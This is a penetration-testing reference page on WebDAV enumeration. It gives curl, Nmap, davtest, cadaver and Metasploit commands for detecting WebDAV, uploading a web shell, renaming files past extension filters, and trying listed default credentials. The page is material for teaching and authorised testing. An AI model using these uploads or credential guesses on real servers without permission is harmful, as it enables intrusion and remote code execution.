% Filename: 02-reconnaissance/enum-web/webdav.md
% Display name: WebDAV Enumeration
% Last update: 2026-02-10
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# WebDAV Enumeration

## Overview

WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow file management on web servers — creating, moving, copying, and deleting files remotely. When enabled (often unintentionally), it can provide direct file upload and code execution paths. WebDAV is commonly found on IIS servers, Apache with mod_dav, and some CMS platforms. It runs on the same port as HTTP (TCP 80/443).

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 80/443
- Tools: davtest, cadaver, Nmap, or curl

## Enumeration Techniques

### Detection

Check if WebDAV is enabled by sending an OPTIONS request:

```bash
# Check allowed HTTP methods
curl -X OPTIONS http://<target>/ -i

# Look for DAV header and methods like PROPFIND, MKCOL, PUT, COPY, MOVE
```

If the response includes a `DAV:` header or methods like `PROPFIND`, `MKCOL`, `PUT`, `COPY`, `MOVE`, `DELETE` — WebDAV is enabled.

```bash
# Nmap
# https://nmap.org/
nmap -p 80,443 --script http-webdav-scan <target>
nmap -p 80,443 --script http-methods --script-args http-methods.url-path='/webdav/' <target>
```

### davtest

```bash
# davtest
# https://github.com/cldrn/davtest
# Tests which file types can be uploaded and executed via WebDAV
davtest -url http://<target>/webdav/

# With credentials
davtest -url http://<target>/webdav/ -auth user:password

# Upload a specific file
davtest -url http://<target>/webdav/ -uploadfile shell.asp -uploadloc shell.asp
```

davtest automatically tests upload permissions for multiple file extensions (asp, aspx, php, jsp, txt, html, etc.) and checks if uploaded files are executable. This reveals which file types can be weaponized.

### cadaver

```bash
# cadaver
# https://notroj.github.io/cadaver/
cadaver http://<target>/webdav/

# Inside cadaver:
# ls                          — list directory
# put shell.aspx              — upload file
# get config.xml              — download file
# move shell.txt shell.aspx   — rename (bypass extension filters)
# delete shell.aspx           — clean up
# mkcol testdir               — create directory
```

cadaver provides an FTP-like interactive interface for WebDAV. Useful for manual exploration and file operations when davtest confirms write access.

### curl WebDAV Operations

```bash
# PROPFIND — list directory contents
curl -X PROPFIND http://<target>/webdav/ -H "Depth: 1" -i

# PUT — upload a file
curl -X PUT http://<target>/webdav/test.txt -d "test content"

# PUT with file
curl -X PUT http://<target>/webdav/shell.aspx -T shell.aspx

# MOVE — rename file (bypass extension filters)
curl -X MOVE http://<target>/webdav/shell.txt -H "Destination: http://<target>/webdav/shell.aspx"

# DELETE — remove file
curl -X DELETE http://<target>/webdav/test.txt

# MKCOL — create directory
curl -X MKCOL http://<target>/webdav/newdir/

# With Basic auth
curl -X PROPFIND http://<target>/webdav/ -H "Depth: 1" -u user:password -i
```

### Metasploit Modules

```bash
# Metasploit
# https://www.metasploit.com/
# WebDAV scanner
auxiliary/scanner/http/webdav_scanner

# WebDAV internal IP disclosure
auxiliary/scanner/http/webdav_internal_ip

# WebDAV content disclosure (PROPFIND enumeration)
auxiliary/scanner/http/webdav_website_content

# IIS WebDAV upload and execute
exploit/windows/iis/iis_webdav_upload_asp
```

### Common WebDAV Paths

| Path | Server |
|------|--------|
| /webdav/ | Generic |
| /dav/ | Generic |
| / (root) | IIS with WebDAV enabled |
| /uploads/ | Custom configurations |

### Default Credentials

WebDAV often uses Basic or Digest authentication. Test common defaults:

| Username | Password |
|----------|----------|
| admin | admin |
| wampp | xampp |
| admin | password |

## Post-Enumeration

With WebDAV access confirmed, prioritize:
- Upload a web shell if write access is available (aspx for IIS, php for Apache)
- Use MOVE method to bypass extension filters — upload as .txt, rename to .aspx/.php
- Check for unauthenticated write access — many WebDAV instances lack authentication
- Look for sensitive files already on the WebDAV share — config files, backups, credentials
- Check directory listing for additional paths and content
- Note: WebDAV on IIS with anonymous access is a critical finding

## References

### Official Documentation

- [Nmap http-webdav-scan NSE Script](https://nmap.org/nsedoc/scripts/http-webdav-scan.html)
- [Nmap http-methods NSE Script](https://nmap.org/nsedoc/scripts/http-methods.html)
- [davtest](https://github.com/cldrn/davtest)
- [RFC 4918 - HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)](https://datatracker.ietf.org/doc/html/rfc4918)

### MITRE ATT&CK

- [T1595 - Active Scanning](https://attack.mitre.org/techniques/T1595/)
